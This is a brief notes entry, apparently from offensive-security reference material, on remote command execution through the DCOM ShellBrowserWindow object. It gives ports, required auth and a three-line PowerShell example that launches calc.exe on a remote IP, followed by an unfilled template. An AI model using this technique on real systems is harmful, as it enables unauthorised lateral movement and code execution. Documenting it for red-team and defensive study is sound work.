## SHELLBROWSERWINDOW

### What it does:
- TL;DR Yet another .Net command execution

PORT TCP 135 (RPCPortmapper) + Random high number port (DCOM)

AUTH Authenticated users

TOOLS PowerShell, direct .NET calls

SIGNATURES MEOW

EX. COMMAND PS> $com = [Type]::GetTypeFromCLSID('C08AFD90-
F2A1-11D1-8455-
00A0C91F3880',"192.168.112.200")

PS> $obj = [System.Activator]::CreateInstance($com)

PS> $obj.Document.Application.ShellExecute("cmd.exe","/c
calc.exe","c:\windows\system32",$null,0)

### Command:
- **Command**: `command_here`
- **Port**: `port_here`
- **Tool**: `tool_here`

### Signatures:
- Signature details or indicators.

### Example of the command in use:
```bash
# Example of how to use the command
command_here -option value
```
